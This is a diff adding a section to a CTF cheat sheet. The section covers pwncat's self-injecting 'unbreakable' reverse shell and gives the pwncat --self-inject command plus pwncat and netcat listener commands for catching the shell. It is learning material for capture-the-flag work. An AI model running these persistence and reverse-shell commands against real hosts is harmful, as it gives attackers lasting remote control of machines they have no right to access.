@@ -249,6 +249,18 @@ CTF CheatSheet that I created over time while solving CTFs and learning various 
 3. `ctrl+z`: Pauses the current shell to the background.
 4. `stty raw -echo; fg`: Sets the terminal to raw mode and brings the shell back from the background to get a fully interactive shell.
 
+## Pwncat unbreakable revShell <img src="https://github.com/cytopia/pwncat/blob/master/art/banner-1.png?raw=true" alt="Pwncat Logo" width="120" style="vertical-align:middle;">
+- Once pwncat has injected itself into the target as an unbreakable reverse shell, you can use any local listener 
+to answer as its request, e.g.: pwncat, netcat, ncat or similar.
+- https://youtu.be/lN10hgl_Ts8?si=qcjrya240WDDconI
+- `pwncat -l <port> --self-inject=<cmd>:<lhost>:<lport>`
+  - e.g. `pwncat -l 1234 --self-inject=/bin/sh:<lhost>:1234`
+  - then 'ctrl + c', and now you can always start a port listener, which automatically connects to the target
+    - e.g. `pwncat -l 1234 -vv` or `nc -lp 1234 -vv`
+      - `-vv`: more detailed verbose
+> [!Note]
+> Does not work on Windows remote hosts yet!
+
 ## Evil-WinRM <img src="https://www.kali.org/tools/evil-winrm/images/evil-winrm-logo.svg" alt="EvilWinRM Logo" width="40" style="vertical-align:middle;">
 - Tool to establish a remote connection to a Windows computer.
 
